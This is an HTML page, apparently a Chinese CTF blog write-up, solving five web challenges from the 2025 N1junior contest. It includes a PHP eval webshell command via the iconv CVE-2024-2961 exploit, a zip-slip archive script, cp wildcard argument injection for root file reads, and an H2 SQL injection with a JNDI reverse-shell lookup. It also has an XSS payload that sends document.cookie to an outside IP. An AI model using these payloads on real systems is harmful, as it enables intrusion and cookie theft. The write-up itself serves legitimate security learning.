@@ -1,0 +1,596 @@
+
+<!DOCTYPE html>
+<html lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <title>[2025]N1junior-WP | GSBP&#39;s Blog</title>
+    <meta name="description"
+        content="Gavatar
+一个php服务
+这里看upload.php有着很明显的任意文件读的漏洞，只需要post一个url参数就可以
+if (!empty($_FILES[&#39;avatar&#39;][&#39;tmp_name&#39;])) {
+    $finfo = new finfo(FILEINFO_MIME_TYPE);
+    if (!in_array($finfo-&gt;file($_FILES[&#39;avatar&#39;][&#39;tmp_name&#39;]), [&#39;image/jpeg&#39;, &#39;image/png&#39;, &#39;image/gif&#39;])) {
+        die(&#39;Invalid file type&#39;);
+    }
+    move_uploaded_file($_FILES[&#39;avatar&#39;][&#39;tmp_name&#39;], $avatarPath);
+} elseif (!empty($_POST[&#39;url&#39;])) {
+    $image = @file_get_contents($_POST[&#39;url&#39;]);
+    if ($image === false) die(&#39;Invalid URL&#39;);
+    file_put_contents($avatarPath, $image);
+}
+flag也不能直接读，需要rce调用/readflag，然后就开始想能不能和其他php文件下的漏洞一起利用
+也是没有其他能够接着利用的漏洞了，然后看到php版本是8.3.4，就想到那个iconv的漏洞利用
+https://www.ambionics.io/blog/iconv-cve-2024-2961-p1
+因为不是直接返回文件内容，而是需要我们从avatar.php中获取，这里需要稍微改一下脚本中的download函数，要提前注册一个用户，然后把session和user填上即可
+    def download(self, path: str) -&gt; bytes:
+        &#34;&#34;&#34;Returns the contents of a remote file.
+        &#34;&#34;&#34;
+        path = f&#34;php://filter/convert.base64-encode/resource={path}&#34;
+        self.send(path)
+        response=self.session.get(&#34;http://39.106.16.204:20871/avatar.php?user=123&#34;)
+        print(response)
+        data = response.text
+        return base64.decode(data)
+然后跑exp就好了
+python test.py http://39.106.16.204:20871/upload.php &#34;echo &#39;&lt;?=@eval(\$_POST[0]);?&gt;&#39; &gt; shell.php&#34;
+">
+    <link rel="canonical" href="http://localhost:1313/post/2025n1junior-wp/" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.7.4/css/bulma.min.css">
+    
+    <link rel="stylesheet" href="http://localhost:1313/scss/style.min.badf012c7f163854e3d9c3287a1df0863ae1974f62e123bbf1f2948b58ed39cf.css">
+
+    <meta property="og:url" content="http://localhost:1313/post/2025n1junior-wp/">
+  <meta property="og:site_name" content="GSBP&#39;s Blog">
+  <meta property="og:title" content="[2025]N1junior-WP">
+  <meta property="og:description" content="Gavatar 一个php服务
+这里看upload.php有着很明显的任意文件读的漏洞，只需要post一个url参数就可以
+if (!empty($_FILES[&#39;avatar&#39;][&#39;tmp_name&#39;])) { $finfo = new finfo(FILEINFO_MIME_TYPE); if (!in_array($finfo-&gt;file($_FILES[&#39;avatar&#39;][&#39;tmp_name&#39;]), [&#39;image/jpeg&#39;, &#39;image/png&#39;, &#39;image/gif&#39;])) { die(&#39;Invalid file type&#39;); } move_uploaded_file($_FILES[&#39;avatar&#39;][&#39;tmp_name&#39;], $avatarPath); } elseif (!empty($_POST[&#39;url&#39;])) { $image = @file_get_contents($_POST[&#39;url&#39;]); if ($image === false) die(&#39;Invalid URL&#39;); file_put_contents($avatarPath, $image); } flag也不能直接读，需要rce调用/readflag，然后就开始想能不能和其他php文件下的漏洞一起利用
+也是没有其他能够接着利用的漏洞了，然后看到php版本是8.3.4，就想到那个iconv的漏洞利用
+https://www.ambionics.io/blog/iconv-cve-2024-2961-p1
+因为不是直接返回文件内容，而是需要我们从avatar.php中获取，这里需要稍微改一下脚本中的download函数，要提前注册一个用户，然后把session和user填上即可
+def download(self, path: str) -&gt; bytes: &#34;&#34;&#34;Returns the contents of a remote file. &#34;&#34;&#34; path = f&#34;php://filter/convert.base64-encode/resource={path}&#34; self.send(path) response=self.session.get(&#34;http://39.106.16.204:20871/avatar.php?user=123&#34;) print(response) data = response.text return base64.decode(data) 然后跑exp就好了
+python test.py http://39.106.16.204:20871/upload.php &#34;echo &#39;&lt;?=@eval(\$_POST[0]);?&gt;&#39; &gt; shell.php&#34;">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2025-02-11T23:00:00+08:00">
+    <meta property="article:modified_time" content="2025-02-11T23:00:00+08:00">
+
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="[2025]N1junior-WP">
+  <meta name="twitter:description" content="Gavatar 一个php服务
+这里看upload.php有着很明显的任意文件读的漏洞，只需要post一个url参数就可以
+if (!empty($_FILES[&#39;avatar&#39;][&#39;tmp_name&#39;])) { $finfo = new finfo(FILEINFO_MIME_TYPE); if (!in_array($finfo-&gt;file($_FILES[&#39;avatar&#39;][&#39;tmp_name&#39;]), [&#39;image/jpeg&#39;, &#39;image/png&#39;, &#39;image/gif&#39;])) { die(&#39;Invalid file type&#39;); } move_uploaded_file($_FILES[&#39;avatar&#39;][&#39;tmp_name&#39;], $avatarPath); } elseif (!empty($_POST[&#39;url&#39;])) { $image = @file_get_contents($_POST[&#39;url&#39;]); if ($image === false) die(&#39;Invalid URL&#39;); file_put_contents($avatarPath, $image); } flag也不能直接读，需要rce调用/readflag，然后就开始想能不能和其他php文件下的漏洞一起利用
+也是没有其他能够接着利用的漏洞了，然后看到php版本是8.3.4，就想到那个iconv的漏洞利用
+https://www.ambionics.io/blog/iconv-cve-2024-2961-p1
+因为不是直接返回文件内容，而是需要我们从avatar.php中获取，这里需要稍微改一下脚本中的download函数，要提前注册一个用户，然后把session和user填上即可
+def download(self, path: str) -&gt; bytes: &#34;&#34;&#34;Returns the contents of a remote file. &#34;&#34;&#34; path = f&#34;php://filter/convert.base64-encode/resource={path}&#34; self.send(path) response=self.session.get(&#34;http://39.106.16.204:20871/avatar.php?user=123&#34;) print(response) data = response.text return base64.decode(data) 然后跑exp就好了
+python test.py http://39.106.16.204:20871/upload.php &#34;echo &#39;&lt;?=@eval(\$_POST[0]);?&gt;&#39; &gt; shell.php&#34;">
+
+    
+
+</head>
+<body><nav class="navbar is-light" role="navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a href="/" title="home" class="navbar-item">
+                <span class="logo">
+                    <h1>GSBP&#39;s Blog</h1>
+                </span>
+            </a>
+
+            
+            <a id="theme-toggle" class="theme-toggle" href="#">
+                <img src="http://localhost:1313/svg/sun.svg" alt="sun icon" class="theme-icon" />
+            </a>
+
+            <a role="button" class="navbar-burger" aria-label="menu" aria-expanded="false">
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+            </a>
+        </div>
+
+        <div class="navbar-menu">
+            <div class="navbar-start">
+                
+                <a href="/about" class="navbar-item">About</a>
+                
+                <a href="/post" class="navbar-item">Blog</a>
+                
+                <a href="/categories" class="navbar-item">Categories</a>
+                
+                <a href="/friend" class="navbar-item">Friends</a>
+                
+            </div>
+
+        </div>
+        <div class="search">
+            <div id="fastSearch">
+                <input id="searchInput" tabindex="0" placeholder="Search..">
+                <ul id="searchResults">
+
+                </ul>
+            </div>
+            <a id="search-btn" style="display: inline-block;" href="# ">
+                <div class="icon-search"><svg class="search-svg" xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg></div>
+            </a>
+        </div>
+
+        <script src="/js/fuse.min.js"></script> 
+        <script src="/js/fastsearch.js"></script>
+
+    </div>
+</nav>
+
+<script>
+    
+    document.addEventListener('DOMContentLoaded', function() {
+        var burger = document.querySelector('.navbar-burger');
+        burger.addEventListener('click', function() {
+            burger.classList.toggle('is-active');
+            document.querySelector('.navbar-menu').classList.toggle('is-active');
+        });
+    });
+
+    
+    function setTheme(theme) {
+        let body = document.body;
+        let themeIcon = document.querySelector(".theme-icon");
+        if (theme === "dark") {
+            body.classList.add("dark-mode");
+            themeIcon.src = "http:\/\/localhost:1313\/svg/moon.svg";
+            themeIcon.alt = "moon icon";
+        } else {
+            body.classList.remove("dark-mode");
+            themeIcon.src = "http:\/\/localhost:1313\/svg/sun.svg";
+            themeIcon.alt = "sun icon";
+        }
+        
+        localStorage.setItem("theme", theme);
+    }
+
+    
+    let theme = localStorage.getItem("theme") || "light";
+    const isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
+    if (isDarkMode) {
+        
+        setTheme('dark');
+
+    } else {
+        
+        setTheme('light');
+    }
+    setTheme(theme);
+
+    
+    document.getElementById("theme-toggle").addEventListener("click", function() {
+        if (theme === "light") {
+            theme = "dark";
+        } else {
+            theme = "light";
+        }
+        setTheme(theme);
+    });
+
+
+
+</script>
+
+</header><main>
+<div class="single-container">
+    <div class="archive">
+        <h1 class="title is-1">[2025]N1junior-WP</h1>
+        <div class="title subtitle heading is-6">
+            <div class="author-info columns is-vcentered">
+                <div class="column">
+                    <div class="columns is-vcentered is-mobile">
+                        
+                        <div class="column is-narrow">
+                            <img src="/img/GSBP.jpg" class="author-image">
+                        </div>
+                        
+                        <div class="column">
+                            <p>GSBP</p>
+                            <p><time>February 11, 2025</time>
+                            </p>
+                        </div>
+                    </div>
+                </div>
+                <div class="small-categories-container">
+                    <a href="/categories/wp">WP</a>
+                </div>
+            </div>
+        </div>
+        <div class="content article-content">
+            <div class="toc-container">
+                
+    <div class="post-toc">
+        
+            <aside>
+                <button id="tocButton" ><h4 id="contents" style="margin-left: 1vw;color:rgb(96, 134, 180);margin-bottom: 0;">CONTENTS</h4></button>
+                <div id="hide"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#gavatar">Gavatar</a></li>
+    <li><a href="#tarefik">tarefik</a></li>
+    <li><a href="#backup">backup</a></li>
+    <li><a href="#easydb">EasyDB</a></li>
+    <li><a href="#display">display</a></li>
+  </ul>
+</nav></div>
+            </aside>
+        
+    </div><script>
+    
+        let button = document.getElementById('tocButton');
+        let hide = document.getElementById("hide");
+        let contents=document.getElementById("contents");
+        button.addEventListener("click", function() {
+        if (hide.style.display!='block') {
+            hide.style.display='block'
+        } else {
+            hide.style.display='none'
+            contents.style.color='rgb(96, 134, 180)'
+        }
+        });
+    
+
+
+
+
+</script>
+            </div>
+            <h2 id="gavatar">Gavatar</h2>
+<p>一个php服务</p>
+<p>这里看upload.php有着很明显的任意文件读的漏洞，只需要post一个url参数就可以</p>
+<pre tabindex="0"><code>if (!empty($_FILES[&#39;avatar&#39;][&#39;tmp_name&#39;])) {
+    $finfo = new finfo(FILEINFO_MIME_TYPE);
+    if (!in_array($finfo-&gt;file($_FILES[&#39;avatar&#39;][&#39;tmp_name&#39;]), [&#39;image/jpeg&#39;, &#39;image/png&#39;, &#39;image/gif&#39;])) {
+        die(&#39;Invalid file type&#39;);
+    }
+    move_uploaded_file($_FILES[&#39;avatar&#39;][&#39;tmp_name&#39;], $avatarPath);
+} elseif (!empty($_POST[&#39;url&#39;])) {
+    $image = @file_get_contents($_POST[&#39;url&#39;]);
+    if ($image === false) die(&#39;Invalid URL&#39;);
+    file_put_contents($avatarPath, $image);
+}
+</code></pre><p>flag也不能直接读，需要rce调用/readflag，然后就开始想能不能和其他php文件下的漏洞一起利用</p>
+<p>也是没有其他能够接着利用的漏洞了，然后看到php版本是8.3.4，就想到那个iconv的漏洞利用</p>
+<p><a href="https://www.ambionics.io/blog/iconv-cve-2024-2961-p1">https://www.ambionics.io/blog/iconv-cve-2024-2961-p1</a></p>
+<p>因为不是直接返回文件内容，而是需要我们从<code>avatar.php</code>中获取，这里需要稍微改一下脚本中的download函数，要提前注册一个用户，然后把session和user填上即可</p>
+<pre tabindex="0"><code>    def download(self, path: str) -&gt; bytes:
+        &#34;&#34;&#34;Returns the contents of a remote file.
+        &#34;&#34;&#34;
+        path = f&#34;php://filter/convert.base64-encode/resource={path}&#34;
+        self.send(path)
+        response=self.session.get(&#34;http://39.106.16.204:20871/avatar.php?user=123&#34;)
+        print(response)
+        data = response.text
+        return base64.decode(data)
+</code></pre><p>然后跑exp就好了</p>
+<pre tabindex="0"><code>python test.py http://39.106.16.204:20871/upload.php &#34;echo &#39;&lt;?=@eval(\$_POST[0]);?&gt;&#39; &gt; shell.php&#34;
+</code></pre><p><img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211210919337.png" alt="image-20250211210919337"></p>
+<p><img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211211005193.png" alt="image-20250211211005193"></p>
+<h2 id="tarefik">tarefik</h2>
+<p>go服务，代码很少，只有一个main.go,这里可以看到直接写了一个flag接口获取flag</p>
+<pre tabindex="0"><code>r.GET(&#34;/flag&#34;, func(c *gin.Context) {
+		xForwardedFor := c.GetHeader(&#34;X-Forwarded-For&#34;)
+
+		if !strings.Contains(xForwardedFor, &#34;127.0.0.1&#34;) {
+			c.JSON(400, gin.H{&#34;error&#34;: &#34;only localhost can get flag&#34;})
+			return
+		}
+
+		flag := os.Getenv(&#34;FLAG&#34;)
+		if flag == &#34;&#34; {
+			flag = &#34;flag{testflag}&#34;
+		}
+
+		c.String(http.StatusOK, flag)
+	})
+</code></pre><p>但是我们可以从Dockerfile里面看到实际上并不是直接将服务暴露在外网，而是使用了tarefik进行了一个代理转发</p>
+<p>traefik.yml</p>
+<pre tabindex="0"><code>providers:
+  file:
+    filename: /app/.config/dynamic.yml
+
+entrypoints:
+  web:
+    address: &#34;:80&#34;
+</code></pre><p>dynamic.yml</p>
+<pre tabindex="0"><code>http:
+  services:
+    proxy:
+      loadBalancer:
+        servers:
+          - url: &#34;http://127.0.0.1:8080&#34;
+
+  routers:
+    index:
+      rule: Path(`/public/index`)
+      entrypoints: [web]
+      service: proxy
+    upload:
+      rule: Path(`/public/upload`)
+      entrypoints: [web]
+      service: proxy
+</code></pre><p>只转发了index和upload两个接口</p>
+<p>我们这里可以从官方文档知道，转发端口这一些的服务配置，都是可以热加载的</p>
+<p><img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211211502362.png" alt="image-20250211211502362"></p>
+<p>那我们接下来的目的就是想能否可以重写dynamic.yml，写入我们的配置，将flag端口转发出来就能达到getflag</p>
+<p>我们将目光转到upload接口上</p>
+<pre tabindex="0"><code>r.POST(&#34;/public/upload&#34;, func(c *gin.Context) {
+		file, err := c.FormFile(&#34;file&#34;)
+		if err != nil {
+			c.JSON(400, gin.H{&#34;error&#34;: &#34;File upload failed&#34;})
+			return
+		}
+
+		randomFolder := randFileName()
+		destDir := filepath.Join(uploadDir, randomFolder)
+
+		if err := os.MkdirAll(destDir, 0755); err != nil {
+			c.JSON(500, gin.H{&#34;error&#34;: &#34;Failed to create directory&#34;})
+			return
+		}
+
+		zipFilePath := filepath.Join(uploadDir, randomFolder+&#34;.zip&#34;)
+		if err := c.SaveUploadedFile(file, zipFilePath); err != nil {
+			c.JSON(500, gin.H{&#34;error&#34;: &#34;Failed to save uploaded file&#34;})
+			return
+		}
+
+		if err := unzipFile(zipFilePath, destDir); err != nil {
+			c.JSON(500, gin.H{&#34;error&#34;: &#34;Failed to unzip file&#34;})
+			return
+		}
+
+		c.JSON(200, gin.H{
+			&#34;message&#34;: fmt.Sprintf(&#34;File uploaded and extracted successfully to %s&#34;, destDir),
+		})
+	})
+</code></pre><p>unzipFile</p>
+<pre tabindex="0"><code>func unzipFile(zipPath, destDir string) error {
+	zipReader, err := zip.OpenReader(zipPath)
+	if err != nil {
+		return err
+	}
+	defer zipReader.Close()
+
+	for _, file := range zipReader.File {
+		filePath := filepath.Join(destDir, file.Name)
+		if file.FileInfo().IsDir() {
+			if err := os.MkdirAll(filePath, file.Mode()); err != nil {
+				return err
+			}
+		} else {
+			err = unzipSimpleFile(file, filePath)
+			if err != nil {
+				return err
+			}
+		}
+	}
+	return nil
+}
+</code></pre><p>这里需要我们上传一个zip文件，然后放到unzipFile函数下进行一个解压</p>
+<p>看到unzipFile中使用了filepath.Join后，联想到了python里的path.join，想着能否把压缩包内的文件名写成../开头的形式，这样的话我们就能成功目录穿越，然后覆盖配置文件了</p>
+<p>尝试出来是可以的，这里我写了个python脚本来达到目的</p>
+<pre tabindex="0"><code>import zipfile
+
+if __name__ == &#34;__main__&#34;:
+    try:
+        binary=open(&#34;config/dynamic.yml&#34;,&#34;r&#34;).read()
+        zipFile = zipfile.ZipFile(&#34;test2.zip&#34;, &#34;w&#34;, zipfile.ZIP_DEFLATED)
+        info = zipfile.ZipInfo(&#34;test2.zip&#34;)
+        zipFile.writestr(&#34;../../.config/dynamic.yml&#34;, binary)
+        zipFile.writestr(&#34;1234.txt&#34;,binary)
+        zipFile.close()
+    except IOError as e:
+        raise e
+</code></pre><p>然后dynamic.yml内容如下,由于XFF头的存在，我们还需要额外加一个添加请求头的中间件</p>
+<pre tabindex="0"><code>http:
+  middlewares:
+    # 定义添加请求头的中间件
+    add-headers:
+      headers:
+        customRequestHeaders:
+          X-Forwarded-For: 127.0.0.1     
+
+  services:
+    proxy:
+      loadBalancer:
+        servers:
+          - url: &#34;http://127.0.0.1:8080&#34;
+
+  routers:
+    index:
+      rule: Path(`/public/index`)
+      entrypoints: [web]
+      service: proxy
+      middlewares:
+        - add-headers  # 应用中间件
+    upload:
+      rule: Path(`/public/upload`)
+      entrypoints: [web]
+      service: proxy
+      middlewares:
+        - add-headers  # 应用中间件
+    flag:
+      rule: Path(`/flag`)
+      entrypoints: [web]
+      service: proxy
+      middlewares:
+        - add-headers
+</code></pre><p><img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211212501322.png" alt="image-20250211212501322"></p>
+<p><img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211212513861.png" alt="image-20250211212513861"></p>
+<h2 id="backup">backup</h2>
+<p>在html的最下面我们可以看到一个注释</p>
+<p><img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211212619285.png" alt="image-20250211212619285"></p>
+<p>然后我们简单绕一下非法传参名就可以了，这是一个shell接口，我们能够直接发命令,所以这里弹个shell方便接下来的操作</p>
+<p><img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211212753361.png" alt="image-20250211212753361"></p>
+<p>flag是400权限，我们这里需要提权</p>
+<p>根目录下面发现了一个backup.sh，内容如下</p>
+<pre tabindex="0"><code>#!/bin/bash
+cd /var/www/html/primary
+while :
+do
+    cp -P * /var/www/html/backup/
+    chmod 755 -R /var/www/html/backup/
+    sleep 15s
+
+done
+</code></pre><p>一个死循环，重复进行了cp chmod的操作</p>
+<p>这里我去ps aux看了一眼，是root一直在执行<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211213018817.png" alt="image-20250211213018817"></p>
+<p>那我们接下来就是在这个backup.sh上做下一步操作了</p>
+<p>我们想要的是能否在primary目录下创建一个指向/flag的软连接，然后cp将软连接所指向的flag文件复制到backup文件夹下，再利用内部自带的chmod命令使我们可读</p>
+<p>但是这里cp使用了-P参数，在help中对该参数解释如下</p>
+<pre tabindex="0"><code>-P, --no-dereference         never follow symbolic links in SOURC
+</code></pre><p>这不是寄了吗?</p>
+<p>但是cp的对象是*参数，这个*参数可以帮助我们注入参数项(一些命令的提权手法就是用到这个操作比如chmod tar等等,不了解的可以上网搜搜)</p>
+<p>我们想要的参数项是这个,允许复制软连接所对应的文件</p>
+<pre tabindex="0"><code> -L, --dereference            always follow symbolic links in SOURCE
+</code></pre><p>由于两个相反的参数会被位置较后的参数所覆盖，我们接下来的操作就是</p>
+<ol>
+<li>创建一个文件名为-L的文件</li>
+<li>创建指向flag的软连接</li>
+<li>等sh执行</li>
+<li>cat flag</li>
+</ol>
+<p>命令如下</p>
+<pre tabindex="0"><code>cd /var/www/html/primary
+&gt;-L
+ln -s /flag flag
+cd ../backup
+cat flag
+</code></pre><p><img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211214222306.png" alt="image-20250211214222306"></p>
+<p><img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211214231436.png" alt="image-20250211214231436"></p>
+<h2 id="easydb">EasyDB</h2>
+<p>服务给我们的有用接口只有一个登陆接口</p>
+<pre tabindex="0"><code>@PostMapping({&#34;/login&#34;})
+    public String handleLogin(@RequestParam String username, @RequestParam String password, HttpSession session, Model model) throws SQLException {
+        if (this.userService.validateUser(username, password)) {
+            session.setAttribute(&#34;username&#34;, username);
+            return &#34;redirect:/&#34;;
+        } else {
+            model.addAttribute(&#34;error&#34;, &#34;Invalid username or password&#34;);
+            return &#34;login&#34;;
+        }
+    }
+</code></pre><p>validateUser中存在着sql注入漏洞</p>
+<pre tabindex="0"><code> public boolean validateUser(String username, String password) throws SQLException {
+        String query = String.format(&#34;SELECT * FROM users WHERE username = &#39;%s&#39; AND password = &#39;%s&#39;&#34;, username, password);
+        if (!SecurityUtils.check(query)) {
+            return false;
+        } else {
+            Throwable var8;
+            try (Statement stmt = this.connection.createStatement()) {
+                stmt.executeQuery(query);
+                ResultSet resultSet = stmt.getResultSet();
+                Throwable var7 = null;
+
+                try {
+                    var8 = resultSet.next();
+                } catch (Throwable var31) {
+                    var8 = var31;
+                    var7 = var31;
+                    throw var31;
+                } finally {
+                    if (resultSet != null) {
+                        if (var7 != null) {
+                            try {
+                                resultSet.close();
+                            } catch (Throwable var30) {
+                                var7.addSuppressed(var30);
+                            }
+                        } else {
+                            resultSet.close();
+                        }
+                    }
+
+                }
+            }
+
+            return (boolean)var8;
+        }
+    }
+</code></pre><p>然后数据库类型是h2数据库，且executeQuery()支持解析多条语句，那就是很平常的h2打法了，因为题目出网，绕黑名单我用的是JNDI注入，不过不出网的话也可以打其他的，方法很多</p>
+<p>payload如下</p>
+<pre tabindex="0"><code>admin&#39;;CREATE ALIAS abc AS &#39;String rce(String cmd) throws Exception {
+new javax.naming.InitialContext().lookup(cmd);
+return &#34;123&#34;;}&#39;;--&amp;password=123
+</code></pre><pre tabindex="0"><code class="language-\" data-lang="\">admin&#39;;CALL abc (&#39;ldap://ip:1389/Deserialize/Jackson/Command/反弹shell命令&#39;);--&amp;password=123
+</code></pre><p><img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211214805890.png" alt="image-20250211214805890"></p>
+<h2 id="display">display</h2>
+<p>这题猪了，一开始以为是DOMPurify的0day，看了一个多小时没戏直接跑路玩游戏去了</p>
+<p>第二天看到hint出了之后很快就有人解了才返回来看这道题,结果才发现</p>
+<pre tabindex="0"><code>const sanitizedText = sanitizeContent(atob(decodeURI(queryText)));
+console.log(sanitizedText)
+
+if (sanitizedText.length &gt; 0) {
+    textInput.innerHTML = sanitizedText;             // 写入预览区
+    contentDisplay.innerHTML = textInput.innerText;  // 写入效果显示区
+
+    insertButton.disabled = false;    
+} else {
+    textInput.innerText = &#34;Only allow h1, h2 tags and plain text&#34;;
+}
+</code></pre><p>这里contentDisplay的值是textInput的innerText啊(就是textInput在浏览器上展示的字符)</p>
+<p>那就可以很简单的利用html实体编码来绕过</p>
+<p><img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211215458831.png" alt="image-20250211215458831"></p>
+<p>可以看到很成功的插入我们的标签，但是这里并没有被DOM所渲染，这里就用到hint了</p>
+<p>我们使用iframe框架来插入script</p>
+<pre tabindex="0"><code>&lt;iframe srcdoc=&#34;&lt;script src=&#39;/a/;fetch(%60http://111.229.198.6:5000/%60+document.cookie);//&#39;&gt;&lt;/script&gt;&#34;&gt;&lt;/iframe
+</code></pre><p><img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211215627738.png" alt="image-20250211215627738"></p>
+<p>可以看到成功执行了，也成功被csp拦了(</p>
+<p>接下来的绕csp就其实很简单了，在前段时间的sekaiCTF做过相同的题</p>
+<p><a href="https://www.justus.pw/writeups/sekai-ctf/tagless.html">https://www.justus.pw/writeups/sekai-ctf/tagless.html</a></p>
+<p>就是利用了404的页面来写入我们的js代码，再用src进行引入就行了</p>
+<p>这里不讲太多，直接贴payload</p>
+<pre tabindex="0"><code>&lt;iframe srcdoc=&#34;&lt;script src=&#39;/a/;fetch(%60http://ip:5000/%60+document.cookie);//&#39;&gt;&lt;/script&gt;&#34;&gt;&lt;/iframe&gt;
+</code></pre><p><img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211215934847.png" alt="image-20250211215934847"></p>
+
+        </div>
+    </div>
+    <a href="#" id="scrollToTopButton">
+        <svg t="1686753152588" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg"
+            p-id="3988" width="48" height="48">
+            <path
+                d="M518.5 360.3c-3.2-4.4-9.7-4.4-12.9 0l-178 246c-3.8 5.3 0 12.7 6.5 12.7H381c10.2 0 19.9-4.9 25.9-13.2L512 460.4l105.2 145.4c6 8.3 15.6 13.2 25.9 13.2H690c6.5 0 10.3-7.4 6.5-12.7l-178-246z"
+                p-id="3989" fill="#363636"></path>
+            <path
+                d="M512 64C264.6 64 64 264.6 64 512s200.6 448 448 448 448-200.6 448-448S759.4 64 512 64z m0 820c-205.4 0-372-166.6-372-372s166.6-372 372-372 372 166.6 372 372-166.6 372-372 372z"
+                p-id="3990" fill="#363636"></path>
+        </svg>
+    </a>
+
+<div class="pp-container">
+        <section class="pre-and-post">
+            <div class="has-text-left">
+                
+                <p>Previous post</p>
+                <a href="http://localhost:1313/post/springaop/">SpringAOP链学习</a>
+                
+            </div>
+            <div class="has-text-right">
+                
+            </div>
+        </section>
+    </div>
+
+</div>
+
+        </main><footer class="footer">
+    <div class="content has-text-centered">
+    <span>&copy; 2025 <a href="http://localhost:1313/">GSBP&#39;s Blog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" target="_blank">Hugo</a> &
+        <a href="https://github.com/hotjuicew/hugo-JuiceBar" target="_blank">JuiceBar</a>
+    </span>
+    </div>
+  </footer></body>
+</html>
+
